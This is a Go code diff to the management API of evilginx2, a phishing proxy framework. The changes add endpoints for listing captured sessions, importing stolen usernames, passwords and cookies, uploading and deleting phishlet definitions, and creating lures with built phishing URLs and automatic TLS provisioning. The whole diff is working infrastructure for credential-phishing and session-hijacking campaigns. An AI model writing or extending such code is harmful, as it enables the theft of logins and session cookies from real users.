@@ -16,15 +16,19 @@ import (
 	"crypto/x509/pkix"
 	"encoding/json"
 	"encoding/pem"
+	"errors"
 	"fmt"
+	"io"
 	"math/big"
 	"net"
 	"net/http"
+	"net/url"
 	"os"
 	"path/filepath"
 	"regexp"
 	"strconv"
 	"strings"
+	"sync"
 	"time"
 
 	"github.com/kgretzky/evilginx2/database"
@@ -32,6 +36,36 @@ import (
 )
 
 const apiStealthLen = 12
+
+const phishletYAMLMax = 256 << 10
+
+var phishletNameRe = regexp.MustCompile(`^[a-zA-Z0-9.-]{1,128}$`)
+
+// apiVersion is the management contract version. Delivery refuses nodes below
+// its supported minimum; bump only on breaking changes.
+const apiVersion = "1"
+
+// apiFeatures advertises what this build can do. Delivery gates provisioning on
+// the subset it needs.
+var apiFeatures = []string{
+	"health",
+	"lures.create",
+	"lures.update",
+	"lures.delete",
+	"lures.list",
+	"lures.external_ref",
+	"status.details",
+	"phishlets.list",
+	"phishlets.push",
+	"sessions.list",
+	"sessions.completed",
+}
+
+func writeApiErr(w http.ResponseWriter, status int, code string, message string) {
+	w.Header().Set("Content-Type", "application/json")
+	w.WriteHeader(status)
+	json.NewEncoder(w).Encode(map[string]string{"code": code, "message": message})
+}
 
 type apiMeta struct {
 	BasePath string `json:"base_path"`
@@ -94,10 +128,11 @@ func apiGenCert(cn string, isCA bool, ips []net.IP, caCert *x509.Certificate, ca
 }
 
 type apiServer struct {
-	db   *database.Database
-	cfg  *Config
-	px   *HttpProxy
-	base string
+	db        *database.Database
+	cfg       *Config
+	px        *HttpProxy
+	base      string
+	phishletM sync.Mutex
 }
 
 func StartApiServer(db *database.Database, cfg *Config, hp *HttpProxy, port int, dir string) {
@@ -170,9 +205,24 @@ func StartApiServer(db *database.Database, cfg *Config, hp *HttpProxy, port int,
 	}
 
 	// server + client certs: always (re)issue if missing
+	// The external IP must be in the SAN: the API is reached from another host
+	// by that address even when bind_ipv4 is empty (wildcard bind).
 	srvIPs := []net.IP{net.ParseIP("127.0.0.1"), net.ParseIP("::1")}
-	if ip := net.ParseIP(cfg.GetServerBindIP()); ip != nil {
-		srvIPs = append(srvIPs, ip)
+	for _, raw := range []string{cfg.GetServerBindIP(), cfg.GetServerExternalIP()} {
+		ip := net.ParseIP(raw)
+		if ip == nil {
+			continue
+		}
+		seen := false
+		for _, have := range srvIPs {
+			if have.Equal(ip) {
+				seen = true
+				break
+			}
+		}
+		if !seen {
+			srvIPs = append(srvIPs, ip)
+		}
 	}
 	srvCert, srvKey, err := apiGenCert("evilginx2-api-server", false, srvIPs, caCert, caKey)
 	if err != nil {
@@ -215,7 +265,9 @@ func StartApiServer(db *database.Database, cfg *Config, hp *HttpProxy, port int,
 
 	a := &apiServer{db: db, cfg: cfg, px: hp, base: meta.BasePath}
 	mux := http.NewServeMux()
+	mux.HandleFunc(a.base+"/healthz", a.handleHealth)
 	mux.HandleFunc(a.base+"/status", a.handleStatus)
+	mux.HandleFunc(a.base+"/capabilities", a.handleCapabilities)
 	mux.HandleFunc(a.base+"/sessions", a.handleSessions)
 	mux.HandleFunc(a.base+"/sessions/", a.handleSessionDetail)
 	mux.HandleFunc(a.base+"/sessions/import", a.handleSessionImport)
@@ -241,12 +293,82 @@ func StartApiServer(db *database.Database, cfg *Config, hp *HttpProxy, port int,
 	}
 }
 
-func (a *apiServer) handleStatus(w http.ResponseWriter, r *http.Request) {
+func (a *apiServer) handleHealth(w http.ResponseWriter, r *http.Request) {
+	if r.Method != "GET" && r.Method != "HEAD" {
+		writeApiErr(w, http.StatusMethodNotAllowed, "method_not_allowed", "GET required")
+		return
+	}
+	w.Header().Set("Content-Type", "application/json")
+	w.Header().Set("Cache-Control", "no-store")
+	w.WriteHeader(http.StatusOK)
+	_, _ = w.Write([]byte(`{"status":"ok"}`))
+}
+
+func (a *apiServer) handleCapabilities(w http.ResponseWriter, r *http.Request) {
 	w.Header().Set("Content-Type", "application/json")
 	json.NewEncoder(w).Encode(map[string]interface{}{
-		"status":     "ok",
-		"time":       time.Now().Unix(),
-		"detonators": a.px.BotguardDetCount(),
+		"api_version": apiVersion,
+		"features":    apiFeatures,
+		"limits": map[string]int{
+			"lures":     4096,
+			"page_size": 200,
+		},
+	})
+}
+
+func (a *apiServer) handleStatus(w http.ResponseWriter, r *http.Request) {
+	phishlets := make(map[string]map[string]interface{})
+	hostnames := make(map[string]string)
+	certs := make(map[string]map[string]interface{})
+	for _, name := range a.cfg.GetPhishletNames() {
+		pc := a.cfg.PhishletConfig(name)
+		pl, err := a.cfg.GetPhishlet(name)
+		if err != nil {
+			continue
+		}
+		// TLS is issued for the phish hosts (phish_sub.site_hostname), not for
+		// the bare site hostname, so readiness is tracked per phish host.
+		landing := pl.GetLandingPhishHost()
+		phishlets[name] = map[string]interface{}{
+			"enabled":  pc.Enabled,
+			"hidden":   !pc.Visible,
+			"hostname": landing,
+		}
+		if landing == "" {
+			continue
+		}
+		hostnames[name] = landing
+		for _, host := range append(pl.GetPhishHosts(false), landing) {
+			if _, done := certs[host]; done {
+				continue
+			}
+			ready, expires := false, int64(0)
+			if a.px != nil && a.px.crt_db != nil {
+				ready, expires = a.px.crt_db.certStatus(host)
+			}
+			certs[host] = map[string]interface{}{
+				"ready":     ready,
+				"not_after": expires,
+			}
+		}
+	}
+	sessions := 0
+	detonators := int64(0)
+	if a.px != nil {
+		sessions = len(a.px.sessions)
+		detonators = a.px.BotguardDetCount()
+	}
+	w.Header().Set("Content-Type", "application/json")
+	json.NewEncoder(w).Encode(map[string]interface{}{
+		"status":      "ok",
+		"version":     BatteriesBuild,
+		"api_version": apiVersion,
+		"time":        time.Now().Unix(),
+		"detonators":  detonators,
+		"load":        map[string]interface{}{"sessions_active": sessions},
+		"phishlets":   phishlets,
+		"hostnames":   hostnames,
+		"certs":       certs,
 	})
 }
 
@@ -317,7 +439,7 @@ func (a *apiServer) handleProxyCfg(w http.ResponseWriter, r *http.Request) {
 	}
 	enabled := a.cfg.proxyConfig.Enabled
 	if err := a.px.setProxy(enabled, pc.Type, pc.Address, pc.Port, pc.Username, pc.Password); err != nil {
-		http.Error(w, `{"error":"`+err.Error()+`"}`, http.StatusBadRequest)
+		writeApiErr(w, http.StatusBadRequest, "bad_request", err.Error())
 		return
 	}
 	pw := ""
@@ -330,9 +452,28 @@ func (a *apiServer) handleProxyCfg(w http.ResponseWriter, r *http.Request) {
 }
 
 func (a *apiServer) handleSessions(w http.ResponseWriter, r *http.Request) {
-	sessions, err := a.db.ListSessions()
+	q := r.URL.Query()
+	filter := database.SessionFilter{
+		Phishlet: q.Get("phishlet"),
+		Lure:     q.Get("lure"),
+		Limit:    200,
+	}
+	if raw := q.Get("since"); raw != "" {
+		if since, err := strconv.ParseInt(raw, 10, 64); err == nil && since > 0 {
+			filter.SinceID = since
+		}
+	}
+	if raw := q.Get("limit"); raw != "" {
+		if limit, err := strconv.Atoi(raw); err == nil && limit > 0 {
+			if limit > 1000 {
+				limit = 1000
+			}
+			filter.Limit = limit
+		}
+	}
+	sessions, err := a.db.ListSessionsFiltered(filter)
 	if err != nil {
-		http.Error(w, `{"error":"`+err.Error()+`"}`, http.StatusInternalServerError)
+		writeApiErr(w, http.StatusInternalServerError, "list_failed", err.Error())
 		return
 	}
 	w.Header().Set("Content-Type", "application/json")
@@ -372,36 +513,38 @@ func (a *apiServer) handleSessionDetail(w http.ResponseWriter, r *http.Request) 
 // handleSessionImport — POST /sessions/import (mTLS): create a session row
 // from a relay capture so it appears in the session list with cookies.
 // Body: {"phishlet","session_id","username","password","cookies":[{name,value,domain,path}],
-//        "useragent","landing_url"}
+//
+//	"useragent","landing_url"}
 func (a *apiServer) handleSessionImport(w http.ResponseWriter, r *http.Request) {
 	if r.Method != "POST" {
 		http.Error(w, `{"error":"POST only"}`, http.StatusMethodNotAllowed)
 		return
 	}
 	var req struct {
-		Phishlet   string `json:"phishlet"`
-		SessionId  string `json:"session_id"`
-		Username   string `json:"username"`
-		Password   string `json:"password"`
-		Cookies    []struct {
+		Phishlet  string `json:"phishlet"`
+		SessionId string `json:"session_id"`
+		Username  string `json:"username"`
+		Password  string `json:"password"`
+		Cookies   []struct {
 			Name   string `json:"name"`
 			Value  string `json:"value"`
 			Domain string `json:"domain"`
 			Path   string `json:"path"`
 		} `json:"cookies"`
 		UserAgent  string `json:"useragent"`
+		LureId     string `json:"lure_id"`
 		LandingURL string `json:"landing_url"`
 	}
 	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
-		http.Error(w, `{"error":"bad body"}`, http.StatusBadRequest)
+		writeApiErr(w, http.StatusBadRequest, "invalid_body", "bad body")
 		return
 	}
 	if req.Phishlet == "" || req.SessionId == "" {
-		http.Error(w, `{"error":"phishlet and session_id are required"}`, http.StatusBadRequest)
+		writeApiErr(w, http.StatusBadRequest, "invalid_body", "phishlet and session_id are required")
 		return
 	}
 	// create the session row
-	if err := a.db.CreateSession(req.SessionId, req.Phishlet, req.LandingURL,
+	if err := a.db.CreateSession(req.SessionId, req.Phishlet, req.LureId, req.LandingURL,
 		req.UserAgent, "relay-import"); err != nil {
 		http.Error(w, `{"error":"`+err.Error()+`"}`, http.StatusConflict)
 		return
@@ -427,9 +570,9 @@ func (a *apiServer) handleSessionImport(w http.ResponseWriter, r *http.Request) 
 				path = "/"
 			}
 			tokens[c.Domain][c.Name] = &database.CookieToken{
-				Name:     c.Name,
-				Value:    c.Value,
-				Path:     path,
+				Name:  c.Name,
+				Value: c.Value,
+				Path:  path,
 			}
 		}
 		a.db.SetSessionCookieTokens(req.SessionId, tokens)
@@ -443,11 +586,15 @@ func (a *apiServer) handleSessionImport(w http.ResponseWriter, r *http.Request) 
 func (a *apiServer) handlePhishlets(w http.ResponseWriter, r *http.Request) {
 	out := []map[string]interface{}{}
 	for _, n := range a.cfg.GetPhishletNames() {
-		out = append(out, map[string]interface{}{
+		entry := map[string]interface{}{
 			"name":    n,
 			"enabled": a.cfg.IsSiteEnabled(n),
 			"hidden":  a.cfg.IsSiteHidden(n),
-		})
+		}
+		if pl, err := a.cfg.GetPhishlet(n); err == nil && pl != nil {
+			entry["site_url"] = pl.OriginUrl()
+		}
+		out = append(out, entry)
 	}
 	w.Header().Set("Content-Type", "application/json")
 	json.NewEncoder(w).Encode(out)
@@ -460,7 +607,7 @@ func (a *apiServer) handlePhishletReload(w http.ResponseWriter, r *http.Request)
 	}
 	rep, err := a.cfg.ReloadPhishlets(a.cfg.PhishletsDir)
 	if err != nil {
-		http.Error(w, `{"error":"`+err.Error()+`"}`, http.StatusBadRequest)
+		writeApiErr(w, http.StatusBadRequest, "bad_request", err.Error())
 		return
 	}
 	if a.px != nil {
@@ -471,13 +618,17 @@ func (a *apiServer) handlePhishletReload(w http.ResponseWriter, r *http.Request)
 }
 
 func (a *apiServer) handlePhishletAction(w http.ResponseWriter, r *http.Request) {
+	parts := strings.Split(strings.TrimPrefix(r.URL.Path, a.base+"/phishlets/"), "/")
+	if len(parts) == 1 && parts[0] != "" {
+		a.handlePhishletItem(w, r, parts[0])
+		return
+	}
 	if r.Method != "POST" {
 		http.Error(w, `{"error":"POST required"}`, http.StatusMethodNotAllowed)
 		return
 	}
-	parts := strings.Split(strings.TrimPrefix(r.URL.Path, a.base+"/phishlets/"), "/")
 	if len(parts) != 2 {
-		http.Error(w, `{"error":"expected /phishlets/{name}/{enable|disable}"}`, http.StatusBadRequest)
+		writeApiErr(w, http.StatusBadRequest, "invalid_path", "expected /phishlets/{name}/{enable|disable|hostname}")
 		return
 	}
 	name, action := parts[0], parts[1]
@@ -487,6 +638,10 @@ func (a *apiServer) handlePhishletAction(w http.ResponseWriter, r *http.Request)
 		err = a.cfg.SetSiteEnabled(name)
 	case "disable":
 		err = a.cfg.SetSiteDisabled(name)
+	case "hide":
+		err = a.cfg.SetSiteHidden(name, true)
+	case "unhide":
+		err = a.cfg.SetSiteHidden(name, false)
 	case "hostname":
 		var req struct {
 			Hostname string `json:"hostname"`
@@ -496,42 +651,198 @@ func (a *apiServer) handlePhishletAction(w http.ResponseWriter, r *http.Request)
 			return
 		}
 		if !a.cfg.SetSiteHostname(name, req.Hostname) {
-			http.Error(w, `{"error":"failed to set hostname"}`, http.StatusBadRequest)
+			writeApiErr(w, http.StatusUnprocessableEntity, "hostname_failed", "failed to set hostname")
 			return
 		}
 	default:
-		http.Error(w, `{"error":"unknown action"}`, http.StatusNotFound)
+		writeApiErr(w, http.StatusNotFound, "unknown_action", "unknown action")
 		return
 	}
 	if err != nil {
-		http.Error(w, `{"error":"`+err.Error()+`"}`, http.StatusBadRequest)
+		writeApiErr(w, http.StatusBadRequest, "bad_request", err.Error())
 		return
+	}
+	// Enable/hostname change must re-provision TLS, exactly like the console
+	// command; run it off the request path.
+	if action != "disable" && a.px != nil {
+		go a.px.RefreshCerts()
 	}
 	w.Header().Set("Content-Type", "application/json")
 	json.NewEncoder(w).Encode(map[string]string{"result": action + " " + name + " ok"})
 }
 
+// handlePhishletItem serves the phishlet source: GET reads it, PUT validates and
+// replaces it atomically, DELETE removes it. "reload" stays reserved for the
+// explicit reload endpoint.
+func (a *apiServer) handlePhishletItem(w http.ResponseWriter, r *http.Request, name string) {
+	if r.Method != "GET" && r.Method != "PUT" && r.Method != "DELETE" {
+		writeApiErr(w, http.StatusMethodNotAllowed, "method_not_allowed", "GET, PUT or DELETE required")
+		return
+	}
+	if name == "reload" || !phishletNameRe.MatchString(name) {
+		writeApiErr(w, http.StatusBadRequest, "invalid_name", "invalid or reserved phishlet name")
+		return
+	}
+	if a.cfg.PhishletsDir == "" {
+		writeApiErr(w, http.StatusConflict, "no_phishlets_dir", "phishlets directory is not configured")
+		return
+	}
+	path := filepath.Join(a.cfg.PhishletsDir, name+".yaml")
+
+	switch r.Method {
+	case "GET":
+		b, err := os.ReadFile(path)
+		if err != nil {
+			if os.IsNotExist(err) {
+				writeApiErr(w, http.StatusNotFound, "phishlet_not_found", "phishlet not found")
+				return
+			}
+			writeApiErr(w, http.StatusInternalServerError, "read_failed", err.Error())
+			return
+		}
+		w.Header().Set("Content-Type", "application/x-yaml")
+		w.Header().Set("Cache-Control", "no-store")
+		w.Header().Set("X-Content-Type-Options", "nosniff")
+		_, _ = w.Write(b)
+	case "PUT":
+		a.phishletM.Lock()
+		defer a.phishletM.Unlock()
+
+		r.Body = http.MaxBytesReader(w, r.Body, phishletYAMLMax)
+		b, err := io.ReadAll(r.Body)
+		if err != nil {
+			var tooBig *http.MaxBytesError
+			if errors.As(err, &tooBig) {
+				writeApiErr(w, http.StatusRequestEntityTooLarge, "too_large", "phishlet YAML exceeds 256 KiB")
+				return
+			}
+			writeApiErr(w, http.StatusBadRequest, "invalid_body", err.Error())
+			return
+		}
+		if len(strings.TrimSpace(string(b))) == 0 {
+			writeApiErr(w, http.StatusUnprocessableEntity, "invalid_yaml", "empty phishlet YAML")
+			return
+		}
+
+		tmp, err := os.CreateTemp(a.cfg.PhishletsDir, ".phishlet-*")
+		if err != nil {
+			writeApiErr(w, http.StatusInternalServerError, "write_failed", err.Error())
+			return
+		}
+		tmpPath := tmp.Name()
+		defer os.Remove(tmpPath)
+		if err := tmp.Chmod(0600); err != nil {
+			tmp.Close()
+			writeApiErr(w, http.StatusInternalServerError, "write_failed", err.Error())
+			return
+		}
+		if _, err := tmp.Write(b); err != nil {
+			tmp.Close()
+			writeApiErr(w, http.StatusInternalServerError, "write_failed", err.Error())
+			return
+		}
+		if err := tmp.Close(); err != nil {
+			writeApiErr(w, http.StatusInternalServerError, "write_failed", err.Error())
+			return
+		}
+		if _, err := NewPhishlet(name, tmpPath, nil, a.cfg); err != nil {
+			writeApiErr(w, http.StatusUnprocessableEntity, "invalid_yaml", err.Error())
+			return
+		}
+
+		_, statErr := os.Stat(path)
+		created := os.IsNotExist(statErr)
+		if err := os.Rename(tmpPath, path); err != nil {
+			writeApiErr(w, http.StatusInternalServerError, "write_failed", err.Error())
+			return
+		}
+		if _, err := a.cfg.ReloadPhishlets(""); err != nil {
+			writeApiErr(w, http.StatusInternalServerError, "reload_failed", err.Error())
+			return
+		}
+		if a.px != nil {
+			go a.px.RefreshCerts()
+		}
+		status := http.StatusOK
+		if created {
+			status = http.StatusCreated
+		}
+		w.Header().Set("Content-Type", "application/json")
+		w.WriteHeader(status)
+		json.NewEncoder(w).Encode(map[string]interface{}{"result": "put " + name + " ok", "created": created})
+	case "DELETE":
+		a.phishletM.Lock()
+		defer a.phishletM.Unlock()
+
+		if err := os.Remove(path); err != nil {
+			if os.IsNotExist(err) {
+				writeApiErr(w, http.StatusNotFound, "phishlet_not_found", "phishlet not found")
+				return
+			}
+			writeApiErr(w, http.StatusInternalServerError, "delete_failed", err.Error())
+			return
+		}
+		if _, err := a.cfg.ReloadPhishlets(""); err != nil {
+			writeApiErr(w, http.StatusInternalServerError, "reload_failed", err.Error())
+			return
+		}
+		if a.px != nil {
+			go a.px.RefreshCerts()
+		}
+		w.Header().Set("Content-Type", "application/json")
+		json.NewEncoder(w).Encode(map[string]string{"deleted": name})
+	}
+}
+
+// lureView renders a lure for the management API, optionally with its URL.
+func lureView(cfg *Config, l *Lure, withURL bool) map[string]interface{} {
+	view := map[string]interface{}{
+		"id": l.Id, "phishlet": l.Phishlet, "path": l.Path,
+		"hostname": l.Hostname, "redirect_url": l.RedirectUrl,
+		"token": l.Token, "relay": l.Relay,
+		"external_ref": l.ExternalRef,
+		"paused":       l.PausedUntil != 0,
+		"redirector":   l.Redirector,
+		"ua_filter":    l.UserAgentFilter,
+		"info":         l.Info,
+		"og_title":     l.OgTitle,
+		"og_desc":      l.OgDescription,
+		"og_image":     l.OgImageUrl,
+		"og_url":       l.OgUrl,
+	}
+	if withURL {
+		values := url.Values{}
+		if built, err := lureUrlFor(cfg, l, values); err == nil {
+			view["url"] = built
+		}
+	}
+	return view
+}
+
 func (a *apiServer) handleLures(w http.ResponseWriter, r *http.Request) {
 	if r.Method == "GET" {
+		phishletFilter := r.URL.Query().Get("phishlet")
+		refFilter := r.URL.Query().Get("external_ref")
 		out := []map[string]interface{}{}
 		for i := 0; i < 4096; i++ {
 			l, err := a.cfg.GetLure(i)
 			if err != nil {
 				break
 			}
-			out = append(out, map[string]interface{}{
-				"id": i, "phishlet": l.Phishlet, "path": l.Path,
-				"hostname": l.Hostname, "redirect_url": l.RedirectUrl,
-				"token": l.Token, "relay": l.Relay,
-				"paused": l.PausedUntil != 0,
-			})
+			if phishletFilter != "" && l.Phishlet != phishletFilter {
+				continue
+			}
+			if refFilter != "" && l.ExternalRef != refFilter {
+				continue
+			}
+			out = append(out, lureView(a.cfg, l, true))
 		}
 		w.Header().Set("Content-Type", "application/json")
 		json.NewEncoder(w).Encode(out)
 		return
 	}
 	if r.Method != "POST" {
-		http.Error(w, `{"error":"POST required"}`, http.StatusMethodNotAllowed)
+		writeApiErr(w, http.StatusMethodNotAllowed, "method_not_allowed", "POST required")
 		return
 	}
 	var req struct {
@@ -540,20 +851,50 @@ func (a *apiServer) handleLures(w http.ResponseWriter, r *http.Request) {
 		RedirectUrl string `json:"redirect_url"`
 		Token       string `json:"token"`
 		Relay       bool   `json:"relay"`
+		ExternalRef string `json:"external_ref"`
 	}
 	if err := json.NewDecoder(r.Body).Decode(&req); err != nil || req.Phishlet == "" {
-		http.Error(w, `{"error":"body must be {\"phishlet\": \"...\", ...}"}`, http.StatusBadRequest)
+		writeApiErr(w, http.StatusBadRequest, "invalid_body", `body must be {"phishlet": "..."}`)
 		return
 	}
-	if _, err := a.cfg.GetPhishlet(req.Phishlet); err != nil {
-		http.Error(w, `{"error":"unknown phishlet"}`, http.StatusBadRequest)
+	pl, err := a.cfg.GetPhishlet(req.Phishlet)
+	if err != nil {
+		writeApiErr(w, http.StatusUnprocessableEntity, "invalid_phishlet", "unknown phishlet")
 		return
+	}
+	hostname := pl.GetLandingPhishHost()
+	if hostname == "" {
+		writeApiErr(w, http.StatusUnprocessableEntity, "hostname_missing", "phishlet hostname is not set")
+		return
+	}
+	if a.px != nil && a.px.crt_db != nil {
+		if ready, _ := a.px.crt_db.certStatus(hostname); !ready {
+			writeApiErr(w, http.StatusLocked, "cert_not_ready", "phishlet hostname certificate is not ready")
+			return
+		}
+	}
+	if req.ExternalRef != "" {
+		for _, existing := range a.cfg.lures {
+			if existing.ExternalRef == req.ExternalRef {
+				writeApiErr(w, http.StatusConflict, "external_ref_taken", "external_ref is already in use")
+				return
+			}
+		}
+	}
+	if req.Path != "" {
+		for _, existing := range a.cfg.lures {
+			if existing.Phishlet == req.Phishlet && existing.Path == req.Path {
+				writeApiErr(w, http.StatusConflict, "path_taken", "path is already used by this phishlet")
+				return
+			}
+		}
 	}
 	l := &Lure{
 		Phishlet:    req.Phishlet,
 		Path:        req.Path,
 		RedirectUrl: req.RedirectUrl,
 		Relay:       req.Relay,
+		ExternalRef: req.ExternalRef,
 	}
 	switch req.Token {
 	case "":
@@ -571,20 +912,39 @@ func (a *apiServer) handleLures(w http.ResponseWriter, r *http.Request) {
 		l.Path = "/" + GenRandomString(8)
 	}
 	a.cfg.AddLure(req.Phishlet, l)
-	// find the index it landed on (lab scale: scan)
-	idx := -1
-	for i := 0; i < 4096; i++ {
-		g, err := a.cfg.GetLure(i)
-		if err != nil {
-			break
-		}
-		if g.Phishlet == l.Phishlet && g.Path == l.Path {
-			idx = i
-			break
-		}
+	built, err := lureUrlFor(a.cfg, l, r.URL.Query())
+	if err != nil {
+		log.Error("api: lure url: %v", err)
 	}
 	w.Header().Set("Content-Type", "application/json")
-	json.NewEncoder(w).Encode(map[string]interface{}{"id": idx, "path": l.Path, "token": l.Token})
+	w.WriteHeader(http.StatusCreated)
+	json.NewEncoder(w).Encode(map[string]interface{}{
+		"id": l.Id, "path": l.Path, "token": l.Token, "url": built,
+	})
+}
+
+// resolveLure addresses lures by their stable id. Numeric indices are no longer
+// accepted: the contract is id-only.
+func (a *apiServer) resolveLure(raw string) (*Lure, error) {
+	return a.cfg.GetLureById(raw)
+}
+
+func lureUrlFor(cfg *Config, l *Lure, params url.Values) (string, error) {
+	pl, err := cfg.GetPhishlet(l.Phishlet)
+	if err != nil {
+		return "", fmt.Errorf("phishlet not found")
+	}
+	var base string
+	if l.Hostname != "" {
+		base = "https://" + l.Hostname + l.Path
+	} else {
+		purl, err := pl.GetLureUrl(l.Path)
+		if err != nil {
+			return "", err
+		}
+		base = purl
+	}
+	return BuildLureUrl(cfg, WithLureToken(base, l.Token), &params), nil
 }
 
 func (a *apiServer) handleLureUrl(w http.ResponseWriter, r *http.Request) {
@@ -593,35 +953,18 @@ func (a *apiServer) handleLureUrl(w http.ResponseWriter, r *http.Request) {
 		a.handleLureItem(w, r, rest)
 		return
 	}
-	id, err := strconv.Atoi(strings.TrimSuffix(rest, "/url"))
+	l, err := a.resolveLure(strings.TrimSuffix(rest, "/url"))
 	if err != nil {
-		http.Error(w, `{"error":"bad lure id"}`, http.StatusBadRequest)
+		writeApiErr(w, http.StatusNotFound, "lure_not_found", "lure not found")
 		return
 	}
-	l, err := a.cfg.GetLure(id)
+	built, err := lureUrlFor(a.cfg, l, r.URL.Query())
 	if err != nil {
-		http.Error(w, `{"error":"lure not found"}`, http.StatusNotFound)
+		writeApiErr(w, http.StatusBadRequest, "bad_request", err.Error())
 		return
 	}
-	pl, err := a.cfg.GetPhishlet(l.Phishlet)
-	if err != nil {
-		http.Error(w, `{"error":"phishlet not found"}`, http.StatusInternalServerError)
-		return
-	}
-	var base string
-	if l.Hostname != "" {
-		base = "https://" + l.Hostname + l.Path
-	} else {
-		purl, err := pl.GetLureUrl(l.Path)
-		if err != nil {
-			http.Error(w, `{"error":"`+err.Error()+`"}`, http.StatusBadRequest)
-			return
-		}
-		base = purl
-	}
-	params := r.URL.Query()
 	w.Header().Set("Content-Type", "application/json")
-	json.NewEncoder(w).Encode(map[string]string{"url": BuildLureUrl(a.cfg, base, &params)})
+	json.NewEncoder(w).Encode(map[string]string{"url": built})
 }
 
 type ppCookieIn struct {
@@ -649,7 +992,7 @@ func (a *apiServer) handlePuppetCookies(w http.ResponseWriter, r *http.Request) 
 		return
 	}
 	if err := a.px.ImportPuppetCookies(req.SessionToken, req.Phishlet, req.Cookies); err != nil {
-		http.Error(w, `{"error":"`+err.Error()+`"}`, http.StatusBadRequest)
+		writeApiErr(w, http.StatusBadRequest, "bad_request", err.Error())
 		return
 	}
 	w.Header().Set("Content-Type", "application/json")
@@ -684,29 +1027,25 @@ func (p *HttpProxy) ImportPuppetCookies(sid string, phishlet string, cookies []p
 }
 
 // handleLureItem — GET detail / PUT edit / DELETE for /lures/{id}.
-// Lure ids are positional; deleting renumbers every later lure.
+// The id is the lure's stable id; positional indices are gone.
 func (a *apiServer) handleLureItem(w http.ResponseWriter, r *http.Request, rest string) {
-	id, err := strconv.Atoi(rest)
-	if err != nil {
-		http.Error(w, `{"error":"bad lure id"}`, http.StatusBadRequest)
+	idx, ok := a.cfg.GetLureIndexById(rest)
+	if !ok {
+		writeApiErr(w, http.StatusNotFound, "lure_not_found", "lure not found")
 		return
 	}
-	l, err := a.cfg.GetLure(id)
-	if err != nil {
-		http.Error(w, `{"error":"lure not found"}`, http.StatusNotFound)
-		return
-	}
+	l := a.cfg.lures[idx]
 	switch r.Method {
 	case "GET":
 		w.Header().Set("Content-Type", "application/json")
-		json.NewEncoder(w).Encode(l)
+		json.NewEncoder(w).Encode(lureView(a.cfg, l, true))
 	case "DELETE":
-		if err := a.cfg.DeleteLure(id); err != nil {
-			http.Error(w, `{"error":"`+err.Error()+`"}`, http.StatusBadRequest)
+		if err := a.cfg.DeleteLureById(l.Id); err != nil {
+			writeApiErr(w, http.StatusBadRequest, "delete_failed", err.Error())
 			return
 		}
 		w.Header().Set("Content-Type", "application/json")
-		json.NewEncoder(w).Encode(map[string]string{"deleted": rest})
+		json.NewEncoder(w).Encode(map[string]string{"deleted": l.Id})
 	case "PUT":
 		var req struct {
 			Hostname        *string `json:"hostname"`
@@ -724,7 +1063,7 @@ func (a *apiServer) handleLureItem(w http.ResponseWriter, r *http.Request, rest 
 			Relay           *bool   `json:"relay"`
 		}
 		if e := json.NewDecoder(r.Body).Decode(&req); e != nil {
-			http.Error(w, `{"error":"bad body"}`, http.StatusBadRequest)
+			writeApiErr(w, http.StatusBadRequest, "invalid_body", "bad body")
 			return
 		}
 		if req.PausedUntil != nil {
@@ -738,14 +1077,14 @@ func (a *apiServer) handleLureItem(w http.ResponseWriter, r *http.Request, rest 
 		}
 		if req.Phishlet != nil {
 			if _, e := a.cfg.GetPhishlet(*req.Phishlet); e != nil {
-				http.Error(w, `{"error":"unknown phishlet"}`, http.StatusBadRequest)
+				writeApiErr(w, http.StatusUnprocessableEntity, "invalid_phishlet", "unknown phishlet")
 				return
 			}
 			l.Phishlet = *req.Phishlet
 		}
 		if req.UserAgentFilter != nil {
 			if _, e := regexp.Compile(*req.UserAgentFilter); e != nil {
-				http.Error(w, `{"error":"bad ua_filter regexp"}`, http.StatusBadRequest)
+				writeApiErr(w, http.StatusUnprocessableEntity, "invalid_ua_filter", "bad ua_filter regexp")
 				return
 			}
 			l.UserAgentFilter = *req.UserAgentFilter
@@ -754,7 +1093,7 @@ func (a *apiServer) handleLureItem(w http.ResponseWriter, r *http.Request, rest 
 			dir := a.cfg.redirectorsDir
 			_, statErr := os.Stat(filepath.Join(dir, *req.Redirector, "index.html"))
 			if dir == "" || statErr != nil {
-				http.Error(w, `{"error":"redirector not found"}`, http.StatusBadRequest)
+				writeApiErr(w, http.StatusUnprocessableEntity, "redirector_not_found", "redirector not found")
 				return
 			}
 			l.Redirector = *req.Redirector
@@ -785,8 +1124,8 @@ func (a *apiServer) handleLureItem(w http.ResponseWriter, r *http.Request, rest 
 		if req.OgUrl != nil {
 			l.OgUrl = *req.OgUrl
 		}
-		if err := a.cfg.SetLure(id, l); err != nil {
-			http.Error(w, `{"error":"`+err.Error()+`"}`, http.StatusBadRequest)
+		if err := a.cfg.SetLure(idx, l); err != nil {
+			writeApiErr(w, http.StatusBadRequest, "update_failed", err.Error())
 			return
 		}
 		if hostname_changed {
@@ -796,8 +1135,8 @@ func (a *apiServer) handleLureItem(w http.ResponseWriter, r *http.Request, rest 
 			}
 		}
 		w.Header().Set("Content-Type", "application/json")
-		json.NewEncoder(w).Encode(l)
+		json.NewEncoder(w).Encode(lureView(a.cfg, l, true))
 	default:
-		http.Error(w, `{"error":"GET/PUT/DELETE only"}`, http.StatusMethodNotAllowed)
+		writeApiErr(w, http.StatusMethodNotAllowed, "method_not_allowed", "GET/PUT/DELETE only")
 	}
 }
